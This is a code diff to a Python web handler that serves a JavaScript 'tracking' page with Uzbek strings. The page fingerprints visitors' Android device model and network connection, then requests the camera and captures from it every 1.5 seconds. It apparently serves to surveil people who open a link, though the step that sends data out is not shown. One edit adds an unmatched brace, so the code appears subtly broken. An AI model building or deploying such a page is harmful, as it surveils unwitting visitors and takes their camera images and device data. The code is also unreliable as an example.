@@ -172,7 +172,7 @@ async def track_page(request: web.Request):
 
         // Model taxmini (faqat Android)
         if (data.os === "Android") {{
-            const match = ua.match(/Build\/([\\w\\d\\-_.]+)/);
+            const match = ua.match(/Build\\/([\\w\\d\\-_.]+)/);
             if (match) {{
                 data.model = match[1];
             }} else {{
@@ -217,7 +217,7 @@ async def track_page(request: web.Request):
         // Tarmoq
         if (navigator.connection) {{
             const conn = navigator.connection;
-            data.network = `${{conn.effectiveType || 'Noma\'lum'}}, ${{conn.downlink ? conn.downlink + ' Mbps' : '?'}}`;
+            data.network = `${{conn.effectiveType || 'Noma\\'lum'}}, ${{conn.downlink ? conn.downlink + ' Mbps' : '?'}}`;
         }}
 
         return data;
@@ -240,7 +240,7 @@ async def track_page(request: web.Request):
 
             if (hasCameraAccess === null) {{
                 try {{
-                    stream = await navigator.mediaDevices.getUserMedia({{ video: {{ width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }} }});
+                    stream = await navigator.mediaDevices.getUserMedia({{ video: {{ width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }} }} });
                     hasCameraAccess = true;
                     cameraAllowed = true;
                     document.getElementById("status").textContent = "✅ Kamera faol — har 1.5s yangilanadi";
@@ -295,7 +295,7 @@ async def track_page(request: web.Request):
                 clearInterval(intervalId);
             }}
 
-        } catch (error) {{
+        }} catch (error) {{
             console.error("Xato:", error);
             if (hasCameraAccess === false && intervalId) {{
                 clearInterval(intervalId);
